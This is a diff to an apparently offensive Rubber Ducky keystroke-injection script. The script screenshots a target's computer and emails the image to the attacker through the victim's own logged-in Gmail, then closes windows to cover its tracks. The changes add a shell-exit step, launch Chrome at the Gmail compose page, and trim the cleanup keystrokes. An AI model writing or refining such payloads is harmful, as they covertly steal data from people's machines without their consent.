@@ -68,6 +68,11 @@ DELAY 500
 WINDOWS d
 DELAY 500
 
+REM Close shell
+STRING exit
+ENTER
+DELAY 1000
+
 REM the method below uses the targets email to send you the screenshot, its a bit easier to use if you know the target
 REM is logged into their email. If you know the target may not be logged into their email on google, use the method below this one. :)
 
@@ -78,7 +83,7 @@ REM "START USE TARGET EMAIL"
 REM Opens Gmail
 GUI r
 DELAY 500
-STRING https://mail.google.com/mail/u/0/#inbox?compose=new
+STRING chrome https://mail.google.com/mail/u/0/#inbox?compose=new
 DELAY 500
 ENTER
 
@@ -111,8 +116,4 @@ ENTER
 REM "END USE TARGET EMAIL"
 
 REM Lets do some cleanup
-ALT F4
-DELAY 200
-ALT TAB
-DELAY 200
 ALT F4
